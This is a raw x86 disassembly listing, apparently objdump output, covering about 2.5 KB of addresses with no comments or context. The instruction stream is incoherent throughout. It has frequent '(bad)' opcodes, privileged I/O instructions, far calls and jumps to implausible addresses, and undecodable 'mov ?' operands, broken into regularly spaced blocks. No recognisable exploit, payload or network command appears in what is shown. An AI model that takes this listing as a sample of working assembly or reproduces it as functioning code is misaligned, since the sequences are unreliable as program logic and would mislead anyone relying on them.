  42c0d1:	stos   DWORD PTR es:[edi],eax
  42c0d2:	push   ds
  42c0d3:	call   0xb54c:0xdbfbd3f4
  42c0da:	and    ah,cl
  42c0dc:	retf   0x6b65
  42c0df:	mov    al,0x16
  42c0e1:	rcr    BYTE PTR [ecx+0x52c7bb3b],cl
  42c0e7:	je     0x42c108
  42c0e9:	push   0x2d
  42c0eb:	call   0xb931baa8
  42c0f0:	fucom  st(0)
  42c0f2:	retf   0xadb7
  42c0f5:	mov    edx,0xfe4e80b6
  42c0fa:	or     eax,0x9a136aaf
  42c0ff:	les    edi,FWORD PTR [edi+0x3f241940]
  42c105:	mov    esi,0xceb450d2
  42c10a:	push   ebp
  42c10b:	cmc    
  42c10c:	mov    ecx,DWORD PTR [esi-0x21]
  42c10f:	inc    eax
  42c110:	int3   
  42c111:	nop
  42c112:	ror    DWORD PTR [ecx-0x29],0xa7
  42c116:	mov    fs:0x7ec0ff48,eax
  42c11c:	in     al,0x9e
  42c11e:	shr    DWORD PTR [edi+0x554947c9],1
  42c124:	add    DWORD PTR [esi-0x5c5e727f],0xfffffffe
  42c12b:	imul   ebp,DWORD PTR [eax+0x210e6be6],0x4d89a04
  42c135:	jmp    0x3af743df
  42c13a:	cli    
  42c13b:	cmp    al,0xb4
  42c13d:	bswap  edx
  42c13f:	mov    ah,0x2d
  42c141:	cmp    BYTE PTR [ebp+0x3be69de],0x5c
  42c148:	inc    ebx
  42c149:	imul   esp,ebp,0x4f
  42c14c:	pop    ecx
  42c14d:	test   al,0x14
  42c14f:	mov    ch,0xa2
  42c151:	or     DWORD PTR ds:0x3659fad2,esi
  42c157:	mul    ecx
  42c159:	and    cl,dl
  42c15b:	xchg   ebx,edi
  42c15d:	dec    esi
  42c15e:	fcom   QWORD PTR [esi-0x7d1ae7bf]
  42c164:	fidivr DWORD PTR [ecx-0x12ca9f52]
  42c16a:	fs sub esp,esi
  42c16d:	fidiv  WORD PTR fs:[ebp+0x48ee9056]
  42c174:	adc    eax,0x27bb0667
  42c179:	mov    ds:0xb2b8d8cb,eax
  42c17e:	ss aaa 
  42c180:	mov    esi,0x1b7a0370
  42c185:	test   BYTE PTR [esi+0x14],dh
  42c188:	retf   
  42c189:	nop
  42c18a:	ss mov cl,0x7
  42c18d:	or     esp,esp
  42c18f:	fwait
  42c190:	popf   
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	pop    es
  42c201:	xchg   ebp,eax
  42c202:	out    0xa5,al
  42c204:	out    0xd8,al
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    eax,0x84000001
  42c20d:	scas   al,BYTE PTR es:[edi]
  42c20e:	clc    
  42c20f:	mov    esi,0xbdfad3fa
  42c214:	sub    eax,0xab6181ea
  42c219:	(bad)  
  42c21a:	hlt    
  42c21b:	aam    0x62
  42c21d:	fldcw  WORD PTR [ebp-0x3]
  42c220:	jo     0x42c1ea
  42c222:	or     ebx,DWORD PTR [edi-0x1]
  42c225:	mov    ds:0xf08713eb,al
  42c22a:	fidivr DWORD PTR [ebx+0x6e]
  42c22d:	(bad)  
  42c22e:	push   ds
  42c22f:	lea    eax,[ebx-0x6c]
  42c232:	pop    es
  42c233:	inc    edx
  42c234:	mov    esp,0x2eae7d46
  42c239:	and    esp,DWORD PTR [ebp-0x63]
  42c23c:	mov    al,ds:0x6f73536d
  42c241:	or     BYTE PTR [edi],0x74
  42c244:	push   ss
  42c245:	lahf   
  42c246:	sbb    al,0x5b
  42c248:	sbb    DWORD PTR gs:[ebp+0x3fddbfd1],0xf56b956f
  42c253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c254:	nop
  42c255:	mov    ?,ecx
  42c257:	leave  
  42c258:	imul   esp,edi,0x69a0d215
  42c25e:	pop    esp
  42c25f:	out    dx,al
  42c260:	aam    0x91
  42c262:	scas   al,BYTE PTR es:[edi]
  42c263:	adc    DWORD PTR [esi],ebp
  42c265:	setnp  BYTE PTR [ebx-0x2774d8d4]
  42c26c:	nop
  42c26d:	imul   esp,DWORD PTR [edi+0x2a],0x4a
  42c271:	xor    DWORD PTR [edx+esi*2-0x64b082e5],0xfffffffd
  42c279:	movzx  eax,BYTE PTR [ebx]
  42c27c:	cmp    edi,DWORD PTR [ebp-0x5a]
  42c27f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c280:	inc    edx
  42c281:	mov    ah,0x9e
  42c283:	imul   ebx,DWORD PTR [edi-0x7],0x49
  42c287:	xor    cl,dl
  42c289:	ror    edx,0x96
  42c28c:	dec    ebx
  42c28d:	nop
  42c28e:	cld    
  42c28f:	add    ebp,esp
  42c291:	rcr    DWORD PTR [eax-0xba41314],0x4d
  42c298:	into   
  42c299:	jno    0x42c23b
  42c29b:	repnz out 0x82,eax
  42c29e:	call   0xcc55:0x938f9cba
  42c2a5:	pusha  
  42c2a6:	cmc    
  42c2a7:	or     esp,ebx
  42c2a9:	iret   
  42c2aa:	cmp    DWORD PTR [ebx],ebp
  42c2ac:	mov    al,0x8
  42c2ae:	mul    edx
  42c2b0:	add    edi,0x5f1c319b
  42c2b6:	sbb    DWORD PTR [edx],edx
  42c2b8:	lods   eax,DWORD PTR ds:[esi]
  42c2b9:	push   ds
  42c2ba:	inc    esi
  42c2bb:	fdivr  st,st(4)
  42c2bd:	in     eax,0x20
  42c2bf:	push   esi
  42c2c0:	adc    dh,BYTE PTR gs:[ebx]
  42c2c3:	mov    ch,0x47
  42c2c5:	pusha  
  42c2c6:	gs iret 
  42c2c8:	ins    DWORD PTR es:[edi],dx
  42c2c9:	mov    esp,0xc0c4ea76
  42c2ce:	cld    
  42c2cf:	(bad)  
  42c2d0:	gs cmc 
  42c2d2:	stos   BYTE PTR es:[edi],al
  42c2d3:	sub    BYTE PTR [ecx],ch
  42c2d5:	dec    DWORD PTR [edi-0x44]
  42c2d8:	and    al,0x1f
  42c2da:	xor    eax,0x463e2d14
  42c2df:	into   
  42c2e0:	pop    edi
  42c2e1:	mov    eax,0xc21bb05a
  42c2e6:	jno    0x42c26d
  42c2e8:	sub    edi,ebp
  42c2ea:	(bad)  
  42c2eb:	mov    ah,0x37
  42c2ed:	psrld  mm4,mm6
  42c2f0:	repnz enter 0x91f6,0x65
  42c2f5:	aad    0x52
  42c2f7:	ret    0x6f49
  42c2fa:	inc    esp
  42c2fb:	sub    al,0x5a
  42c2fd:	ds hlt 
  42c2ff:	jg     0x42c2da
  42c301:	loope  0x42c341
  42c303:	ret    0x5df2
  42c306:	pushf  
  42c307:	outs   dx,BYTE PTR ds:[esi]
  42c308:	push   edi
  42c309:	ins    BYTE PTR es:[edi],dx
  42c30a:	int    0x31
  42c30c:	jae    0x42c2d6
  42c30e:	jmp    0x0:0xd2bc
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x70eedef6
  42c383:	(bad)  
  42c384:	jmp    0x42c35f
  42c386:	add    DWORD PTR [eax],eax
  42c388:	add    eax,0x3000001
  42c38d:	stos   BYTE PTR es:[edi],al
  42c38e:	into   
  42c38f:	pop    edx
  42c390:	loope  0x42c392
  42c392:	lods   al,BYTE PTR ds:[esi]
  42c393:	dec    ecx
  42c394:	push   eax
  42c395:	test   BYTE PTR [esi-0x45],dl
  42c398:	imul   edi,DWORD PTR [edx-0x87c5f9a],0xffffffe6
  42c39f:	push   eax
  42c3a0:	sub    BYTE PTR [edi+0x5e],cl
  42c3a3:	loop   0x42c364
  42c3a5:	ss jge 0x42c333
  42c3a8:	pop    ss
  42c3a9:	repz scas eax,DWORD PTR es:[edi]
  42c3ab:	ja     0x42c427
  42c3ad:	inc    ebx
  42c3ae:	call   0xe9c341d2
  42c3b3:	rol    cl,1
  42c3b5:	xchg   ebx,eax
  42c3b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c3b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3b8:	sub    DWORD PTR [eax+edi*8],0x22
  42c3bc:	scas   al,BYTE PTR es:[edi]
  42c3bd:	inc    esp
  42c3be:	mov    al,0xf2
  42c3c0:	repnz pop es
  42c3c2:	fidiv  WORD PTR [edx]
  42c3c4:	jge    0x42c408
  42c3c6:	sti    
  42c3c7:	adc    al,0x95
  42c3c9:	sbb    al,0xf4
  42c3cb:	mov    esp,0x2a0792e9
  42c3d0:	mov    esi,ecx
  42c3d2:	fld    TBYTE PTR [ecx-0x5a04ff19]
  42c3d8:	repnz fisubr DWORD PTR ds:0x7f1befd6
  42c3df:	gs mov cl,0xc6
  42c3e2:	pusha  
  42c3e3:	inc    esi
  42c3e4:	retf   
  42c3e5:	(bad)  
  42c3e6:	pop    edi
  42c3e7:	icebp  
  42c3e8:	les    esi,FWORD PTR [eax-0x71]
  42c3eb:	and    BYTE PTR [edx+0x4a16eafe],cl
  42c3f1:	cdq    
  42c3f2:	out    0x97,eax
  42c3f4:	dec    edi
  42c3f5:	xor    edx,0xd125dab8
  42c3fb:	(bad)  
  42c3fd:	iret   
  42c3fe:	pop    ebp
  42c3ff:	push   ecx
  42c400:	sub    BYTE PTR [eax+0x5ca259fc],dl
  42c406:	(bad)  
  42c408:	jecxz  0x42c476
  42c40a:	pop    ebp
  42c40b:	jmp    0x42c489
  42c40d:	cwde   
  42c40e:	xor    bl,BYTE PTR [eax-0x7d]
  42c411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c412:	inc    ebp
  42c413:	ret    
  42c414:	inc    edx
  42c415:	cmp    ecx,DWORD PTR [eax+0x4]
  42c418:	adc    DWORD PTR [ebp+0x30],0xd9671810
  42c41f:	out    dx,al
  42c420:	jle    0x42c446
  42c422:	mov    ebx,0x780b4817
  42c427:	push   ds
  42c428:	fadd   st,st(7)
  42c42a:	cmc    
  42c42b:	les    ebp,FWORD PTR [ebx]
  42c42d:	mov    ch,0x23
  42c42f:	out    0x9,al
  42c431:	daa    
  42c432:	sub    al,0xd3
  42c434:	xor    DWORD PTR [edi],esp
  42c436:	jnp    0x42c42d
  42c438:	xor    BYTE PTR [edx-0x17307a5e],bh
  42c43e:	push   0x59
  42c440:	cmp    DWORD PTR [edi-0x52117fe8],edi
  42c446:	pop    es
  42c447:	add    eax,0x880578e3
  42c44c:	cs dec edx
  42c44e:	jo     0x42c4ac
  42c450:	mov    ds:0x1ef16083,al
  42c455:	inc    ecx
  42c456:	pop    ds
  42c457:	adc    eax,0x735bc450
  42c45c:	je     0x42c447
  42c45e:	pop    ebp
  42c45f:	mov    dh,BYTE PTR [edi+0x7131c8af]
  42c465:	or     DWORD PTR [esi],edi
  42c467:	(bad)  
  42c468:	sar    DWORD PTR [ebx],cl
  42c46a:	mov    esi,0x3c1d853c
  42c46f:	ficom  WORD PTR [edx+0x55ed48ca]
  42c475:	add    eax,0x9e9ece9d
  42c47a:	mov    eax,0xed045c8
  42c47f:	xchg   ecx,eax
  42c480:	rol    ebp,cl
  42c482:	mov    esi,0x35984bfd
  42c487:	inc    esp
  42c488:	in     al,dx
  42c489:	and    al,BYTE PTR [ebx+edx*2]
  42c48c:	int3   
  42c48d:	ja     0x42c499
  42c48f:	sbb    eax,ebx
	...
  42c4f1:	add    BYTE PTR [eax],al
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x934,0xb6
  42c502:	jns    0x42c4a8
  42c504:	lock fiadd DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0x17000001,al
  42c50d:	test   BYTE PTR [ecx+0x3f],cl
  42c510:	jo     0x42c4ce
  42c512:	or     al,0xa4
  42c514:	cmc    
  42c515:	es jns 0x42c49d
  42c518:	in     eax,0xc0
  42c51a:	std    
  42c51b:	shl    BYTE PTR [esi-0x33],cl
  42c51e:	sub    DWORD PTR [ebp-0x61],ebx
  42c521:	loope  0x42c569
  42c523:	sbb    eax,0xc885b61a
  42c528:	(bad)  
  42c529:	aaa    
  42c52a:	inc    edx
  42c52b:	mov    ch,0xf8
  42c52d:	jnp    0x42c539
  42c52f:	dec    esi
  42c530:	(bad)  
  42c531:	clc    
  42c532:	repnz mov al,ds:0xba1ae59b
  42c538:	in     eax,0x56
  42c53a:	push   edx
  42c53b:	outs   dx,DWORD PTR ds:[esi]
  42c53c:	in     ax,dx
  42c53e:	ins    BYTE PTR es:[edi],dx
  42c53f:	sbb    BYTE PTR [ebx+0x3],0x1c
  42c543:	adc    cl,BYTE PTR [edi+0x59]
  42c546:	adc    cl,ah
  42c548:	and    ch,bl
  42c54a:	inc    ecx
  42c54b:	sti    
  42c54c:	adc    al,0x15
  42c54e:	out    0xd5,al
  42c550:	inc    BYTE PTR [eax+0x61]
  42c553:	icebp  
  42c554:	or     BYTE PTR [ebp-0x65],bl
  42c557:	inc    ebp
  42c558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c559:	ss pushf 
  42c55b:	adc    BYTE PTR [ebx+0x4c509d52],bl
  42c561:	cwde   
  42c562:	xchg   esi,eax
  42c563:	pop    eax
  42c564:	(bad)  
  42c565:	adc    ecx,DWORD PTR [esi+0x1d44b99d]
  42c56b:	mov    al,0x29
  42c56d:	out    0xf9,al
  42c56f:	jecxz  0x42c556
  42c571:	(bad)  
  42c572:	lahf   
  42c573:	sbb    BYTE PTR [esi-0x62a2617e],bl
  42c579:	mov    ds:0x51b77771,al
  42c57e:	cmp    al,0x64
  42c580:	mov    ?,edi
  42c582:	and    BYTE PTR [esi-0x74878c9c],bh
  42c588:	xor    al,0x8d
  42c58a:	fwait
  42c58b:	dec    DWORD PTR [eax+esi*8-0x7b]
  42c58f:	and    al,0x23
  42c591:	pop    edi
  42c592:	cli    
  42c593:	sub    edi,eax
  42c595:	push   ds
  42c596:	not    BYTE PTR [eax-0x4]
  42c599:	push   ss
  42c59a:	and    al,0x4e
  42c59c:	xor    al,0xae
  42c59e:	and    eax,DWORD PTR [si+0x43]
  42c5a2:	bswap  edi
  42c5a4:	popf   
  42c5a5:	ds out dx,al
  42c5a7:	push   es
  42c5a8:	sub    al,0x77
  42c5aa:	mov    edx,0x800a85c7
  42c5af:	sub    edi,DWORD PTR ds:0x4a2269a
  42c5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5b6:	mov    esi,esp
  42c5b8:	and    eax,0x187dd39
  42c5bd:	adc    eax,0xb8e72144
  42c5c2:	mov    eax,ds:0xa50c0712
  42c5c7:	lds    edi,FWORD PTR [eax-0x23b586fa]
  42c5cd:	xchg   esp,eax
  42c5ce:	sbb    BYTE PTR [ebx+ebp*4-0x6cce9e82],0x34
  42c5d6:	xchg   edi,eax
  42c5d7:	sbb    ebp,DWORD PTR [eax+0x64928484]
  42c5dd:	push   eax
  42c5de:	and    ebx,DWORD PTR [edx+0x36]
  42c5e1:	std    
  42c5e2:	lock lds ebp,FWORD PTR [ecx]
  42c5e5:	xchg   DWORD PTR [ebx],edi
  42c5e7:	sbb    ah,dl
  42c5e9:	fwait
  42c5ea:	sub    cl,BYTE PTR [ecx-0x2f6a80e5]
  42c5f0:	push   ecx
  42c5f1:	les    ebx,FWORD PTR [eax]
  42c5f3:	push   ds
  42c5f4:	push   esp
  42c5f5:	mov    edi,0xcf6222be
  42c5fa:	inc    ebx
  42c5fb:	pop    cx
  42c5fd:	push   0x82b0caf0
  42c602:	test   al,0x31
  42c604:	fmul   st,st(4)
  42c606:	cwde   
  42c607:	lods   eax,DWORD PTR ds:[esi]
  42c608:	and    al,0x64
  42c60a:	pop    edx
  42c60b:	xor    ch,bh
  42c60d:	dec    ecx
  42c60e:	sbb    al,0xf2
  42c610:	xchg   edi,eax
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x28920395]
  42c681:	dec    esi
  42c682:	and    al,0xa9
  42c684:	cmc    
  42c685:	fild   DWORD PTR [ecx]
  42c687:	add    BYTE PTR ds:0x37000001,al
  42c68d:	jp     0x42c64a
  42c68f:	push   0xffffffc6
  42c691:	loop   0x42c67b
  42c693:	aaa    
  42c694:	cs mov esp,0x3d00f224
  42c69a:	ins    BYTE PTR es:[edi],dx
  42c69b:	(bad)  [edx]
  42c69d:	repz push 0xf
  42c6a0:	iret   
  42c6a1:	xchg   ebp,eax
  42c6a2:	or     al,0x1c
  42c6a4:	mov    cl,0x2f
  42c6a6:	mov    ebp,0xd1669870
  42c6ab:	clc    
  42c6ac:	call   0x702d:0x5b06c43c
  42c6b3:	xchg   edx,eax
  42c6b4:	and    al,0x63
  42c6b6:	xchg   DWORD PTR [edi-0x74a28a8],ecx
  42c6bc:	test   BYTE PTR [eax+0x13],ch
  42c6bf:	(bad)  [esi+0xe1269cb]
  42c6c5:	cld    
  42c6c6:	shl    BYTE PTR [ebx],cl
  42c6c8:	lods   al,BYTE PTR ds:[esi]
  42c6c9:	int    0x3e
  42c6cb:	cmp    eax,0xc1130246
  42c6d0:	add    edx,eax
  42c6d2:	xchg   esp,eax
  42c6d3:	jge    0x42c6a9
  42c6d5:	(bad)  
  42c6d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6d7:	fs pushf 
  42c6d9:	fbstp  TBYTE PTR [edx-0x6d83f668]
  42c6df:	jnp    0x42c705
  42c6e1:	mov    ah,0x85
  42c6e3:	js     0x42c68f
  42c6e5:	lods   al,BYTE PTR ds:[esi]
  42c6e6:	mov    esi,0x4ba301c8
  42c6eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6ec:	ror    DWORD PTR [ecx-0x13],0x55
  42c6f0:	ja     0x42c6c3
  42c6f2:	push   edx
  42c6f3:	pop    ebx
  42c6f4:	(bad)  
  42c6f5:	pop    edx
  42c6f6:	mov    ebp,?
  42c6f8:	ja     0x42c697
  42c6fa:	fwait
  42c6fb:	daa    
  42c6fc:	push   ecx
  42c6fd:	pop    ebp
  42c6fe:	pop    ds
  42c6ff:	out    0xb9,al
  42c701:	popa   
  42c702:	adc    esi,ecx
  42c704:	push   0xffffff80
  42c706:	jmp    0x42c74c
  42c708:	jmp    0x8b6e57b4
  42c70d:	mov    cl,0xfa
  42c70f:	stc    
  42c710:	cmp    edi,ecx
  42c712:	mov    bl,0x78
  42c714:	push   cs
  42c715:	cmp    eax,0x5d09def5
  42c71a:	or     eax,0xf2a26c7f
  42c71f:	test   BYTE PTR [edx+0x6f],0xea
  42c723:	ds xor eax,0x3336d39b
  42c729:	das    
  42c72a:	or     al,0xb6
  42c72c:	ins    DWORD PTR es:[edi],dx
  42c72d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c72e:	cdq    
  42c72f:	lea    esp,[edi+ebx*8]
  42c732:	hlt    
  42c733:	pop    ds
  42c734:	inc    esp
  42c735:	jo     0x42c6dc
  42c737:	xchg   esp,eax
  42c738:	mov    cl,0x16
  42c73a:	clc    
  42c73b:	push   ss
  42c73c:	fndisi(8087 only) 
  42c73e:	and    bh,bh
  42c740:	mov    esi,0xd8cbb03
  42c745:	xor    al,0x55
  42c747:	sbb    bh,BYTE PTR [ebp-0x19d97382]
  42c74d:	cmp    eax,0x4f5b13ca
  42c752:	dec    ebx
  42c753:	push   esi
  42c754:	loope  0x42c72e
  42c756:	lods   al,BYTE PTR ds:[esi]
  42c757:	jl     0x42c724
  42c759:	mov    edi,0x97dc7189
  42c75e:	jnp    0x42c704
  42c760:	xor    eax,0xf90ef7fb
  42c765:	mov    ebx,0x5bd042f0
  42c76a:	jmp    0x42c769
  42c76c:	out    0xd9,eax
  42c76e:	ins    BYTE PTR es:[edi],dx
  42c76f:	or     dh,BYTE PTR [ecx+0x10017fd5]
  42c775:	call   0x9f39:0xe2b833fb
  42c77c:	lea    edi,[ecx+0x37]
  42c77f:	sbb    DWORD PTR [ecx+0x31],0x93d2dc32
  42c786:	jb     0x42c711
  42c788:	and    eax,DWORD PTR ds:[esi-0x1fa37abb]
  42c78f:	sub    al,0x6f
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0x783aa40e
  42c802:	lods   eax,DWORD PTR ds:[esi]
  42c803:	adc    edi,edx
  42c805:	fadd   QWORD PTR [ecx]
  42c807:	add    BYTE PTR ds:0x24000001,al
  42c80d:	sbb    ebx,DWORD PTR ds:0xa7b3eb94
  42c813:	outs   dx,BYTE PTR ds:[esi]
  42c814:	mov    dh,0xd4
  42c816:	xor    eax,0xdea5f9e3
  42c81b:	jo     0x42c7cf
  42c81d:	jno    0x42c892
  42c81f:	mov    eax,ds:0x4d99f3ab
  42c824:	retf   
  42c825:	adc    dh,BYTE PTR [ebp+0x19390df3]
  42c82b:	dec    esp
  42c82c:	jo     0x42c7f4
  42c82e:	xchg   edx,eax
  42c82f:	mov    esi,0xb0a22af6
  42c834:	aad    0x7a
  42c836:	sbb    DWORD PTR [esi+0x2aa77b2],ecx
  42c83c:	pop    esi
  42c83d:	ds jge 0x42c857
  42c840:	add    al,BYTE PTR ds:0x3fe5fbcc
  42c846:	ror    DWORD PTR [esi+0x225a25a5],0xf4
  42c84d:	add    esp,DWORD PTR [edx]
  42c84f:	cmp    eax,0xffffff9a
  42c852:	xor    DWORD PTR [eax+ebp*4],edx
  42c855:	lods   al,BYTE PTR ds:[esi]
  42c856:	je     0x42c8d2
  42c858:	dec    esp
  42c859:	ret    0xf9db
  42c85c:	add    BYTE PTR [eax*1+0x7e15e2],ch
  42c863:	js     0x42c7e5
  42c865:	stos   DWORD PTR es:[edi],eax
  42c866:	mov    ds:0xc9e2d12b,al
  42c86b:	cmp    cl,BYTE PTR [ecx]
  42c86d:	dec    esp
  42c86e:	std    
  42c86f:	mov    DWORD PTR [eax-0x7f177a28],esi
  42c875:	mov    eax,ds:0x18d59cf6
  42c87a:	ins    BYTE PTR es:[edi],dx
  42c87b:	dec    edx
  42c87c:	mov    bl,0x12
  42c87e:	sub    al,0xfc
  42c880:	std    
  42c881:	adc    al,0x74
  42c883:	push   edx
  42c884:	xchg   edi,eax
  42c885:	out    0x9f,al
  42c887:	sub    BYTE PTR [esi],dh
  42c889:	out    0xcb,eax
  42c88b:	xchg   edx,eax
  42c88c:	in     eax,0x5a
  42c88e:	outs   dx,DWORD PTR ds:[esi]
  42c88f:	jne    0x42c82a
  42c891:	mov    ?,WORD PTR [edi+0x7caaa02a]
  42c897:	push   ss
  42c898:	push   esp
  42c899:	pop    edi
  42c89a:	and    eax,0x7df1bcdb
  42c89f:	stos   DWORD PTR es:[edi],eax
  42c8a0:	xchg   edi,eax
  42c8a1:	cwde   
  42c8a2:	xchg   ebx,eax
  42c8a3:	push   edi
  42c8a4:	mov    bh,0x7c
  42c8a6:	out    dx,eax
  42c8a7:	retf   
  42c8a8:	in     al,0x46
  42c8aa:	shl    DWORD PTR [ecx],1
  42c8ac:	call   0x40877b1a
  42c8b1:	pop    edi
  42c8b2:	nop
  42c8b3:	bound  edi,QWORD PTR [ebp-0x5b]
  42c8b6:	push   cs
  42c8b7:	mov    WORD PTR [eax+0x6e3f1b2d],ds
  42c8bd:	dec    esi
  42c8be:	sbb    eax,0x519f9fe5
  42c8c3:	(bad)  
  42c8c4:	fcomip st,st(4)
  42c8c6:	pushf  
  42c8c7:	lods   al,BYTE PTR ds:[esi]
  42c8c8:	jb     0x42c859
  42c8ca:	push   es
  42c8cb:	xchg   ecx,eax
  42c8cc:	ficom  WORD PTR fs:[ebx]
  42c8cf:	lds    edx,FWORD PTR [ecx+ebx*4+0x421cf430]
  42c8d6:	repz rol BYTE PTR [edi+0x64],1
  42c8da:	and    al,0x35
  42c8dc:	out    0x8f,al
  42c8de:	aad    0xea
  42c8e0:	imul   edx,edx,0x32
  42c8e3:	add    al,0x3d
  42c8e5:	mov    ds:0x7a2d68d0,al
  42c8ea:	imul   esp,ebp,0xffffffb5
  42c8ed:	aad    0x83
  42c8ef:	cmp    BYTE PTR [ebx+0x503c5c52],bh
  42c8f5:	inc    ecx
  42c8f6:	outs   dx,DWORD PTR ds:[esi]
  42c8f7:	rcr    BYTE PTR [ecx+0x3],cl
  42c8fa:	les    edx,FWORD PTR [eax+0x2a]
  42c8fd:	sbb    bl,BYTE PTR [ebx-0x40]
  42c900:	add    bl,bl
  42c902:	xchg   edx,eax
  42c903:	xor    ah,BYTE PTR [edi]
  42c905:	loopne 0x42c90e
  42c907:	jg     0x42c97b
  42c909:	mov    ebp,0xb5854880
  42c90e:	call   0x0:0x85c5
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x4cf43664
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0xf8000001,al
  42c98d:	mov    BYTE PTR [ebx],bh
  42c98f:	iret   
  42c990:	push   0x16ffcb52
  42c995:	xor    BYTE PTR [ebp-0x4f77d086],ah
  42c99b:	pop    edx
  42c99c:	push   edx
  42c99d:	jecxz  0x42ca13
  42c99f:	or     dh,BYTE PTR [ebp+0x77]
  42c9a2:	sbb    eax,0xe4fb29
  42c9a7:	nop
  42c9a8:	mov    esp,0x16052066
  42c9ad:	jg     0x42c93a
  42c9af:	rcl    ch,cl
  42c9b1:	cmp    DWORD PTR [edx-0x4d],0x6c
  42c9b5:	pop    eax
  42c9b6:	inc    esi
  42c9b7:	fmul   DWORD PTR [edx]
  42c9b9:	out    dx,eax
  42c9ba:	mov    edi,0x3b220669
  42c9bf:	retf   
  42c9c0:	sbb    DWORD PTR [ebp+0x78],edx
  42c9c3:	or     eax,0x20030d99
  42c9c8:	ret    0x9ec5
  42c9cb:	aas    
  42c9cc:	sti    
  42c9cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9ce:	or     cl,dh
  42c9d0:	in     eax,0x48
  42c9d2:	fisttp DWORD PTR [ecx+0x30]
  42c9d5:	lds    ebp,FWORD PTR ss:[edi-0x10a71d67]
  42c9dc:	push   esp
  42c9dd:	(bad)  
  42c9de:	clc    
  42c9df:	mov    cl,0xdc
  42c9e1:	lahf   
  42c9e2:	dec    edi
  42c9e3:	pop    es
  42c9e4:	xchg   edx,eax
  42c9e5:	loope  0x42ca04
  42c9e7:	adc    al,0xd6
  42c9e9:	add    ah,dh
  42c9eb:	test   DWORD PTR [esi+ebx*8+0x345a2f5b],ebp
  42c9f2:	cld    
  42c9f3:	clc    
  42c9f4:	xchg   esp,eax
  42c9f5:	(bad)  
  42c9f6:	mov    edx,0xef77e1a9
  42c9fb:	xchg   ebx,edx
  42c9fd:	add    DWORD PTR [ebp+0x43],eax
  42ca00:	or     DWORD PTR [edi+esi*8-0x2f53fbaf],edi
  42ca07:	sub    eax,0xdcf0720a
  42ca0c:	push   esi
  42ca0d:	aas    
  42ca0e:	mov    al,0x3f
  42ca10:	lahf   
  42ca11:	xchg   DWORD PTR [edi],ebp
  42ca13:	sub    ebp,DWORD PTR [ebx+0x7b]
  42ca16:	or     al,0xb6
  42ca18:	cld    
  42ca19:	lods   eax,DWORD PTR ds:[esi]
  42ca1a:	push   esp
  42ca1b:	mov    eax,ds:0x6fae4a5b
  42ca20:	scas   eax,DWORD PTR es:[edi]
  42ca21:	and    eax,0xb5edc379
  42ca26:	aas    
  42ca27:	adc    BYTE PTR [ebp+0x40e707aa],al
  42ca2d:	test   al,0x66
  42ca2f:	jns    0x42ca15
  42ca31:	pop    eax
  42ca32:	jp     0x42c9eb
  42ca34:	pop    ss
  42ca35:	stos   BYTE PTR es:[edi],al
  42ca36:	dec    esp
  42ca37:	aad    0x13
  42ca39:	mov    BYTE PTR ds:[ebp-0x62],bl
  42ca3d:	out    0xa1,eax
  42ca3f:	mov    dl,0xc3
  42ca41:	pop    es
  42ca42:	sub    BYTE PTR [ebp+0x55],bl
  42ca45:	mov    esp,0xc1cb5178
  42ca4a:	jp     0x42ca3c
  42ca4c:	mov    esp,0x4419b6e5
  42ca51:	clc    
  42ca52:	ficom  DWORD PTR [ecx]
  42ca54:	retf   
  42ca55:	mov    al,ds:0xfdc4d9b8
  42ca5a:	(bad)  [ecx]
  42ca5c:	js     0x42ca3c
  42ca5e:	pop    esi
  42ca5f:	mov    ebp,0x6601b27e
  42ca64:	in     eax,0x6a
  42ca66:	mov    BYTE PTR [ebx+0x495a25c7],ah
  42ca6c:	dec    BYTE PTR [ebp+0x6d]
  42ca6f:	fsub   DWORD PTR [ecx]
  42ca71:	pushf  
  42ca72:	cwde   
  42ca73:	les    esp,FWORD PTR [eax]
  42ca75:	retf   0xc1ed
  42ca78:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42ca7a:	je     0x42ca8a
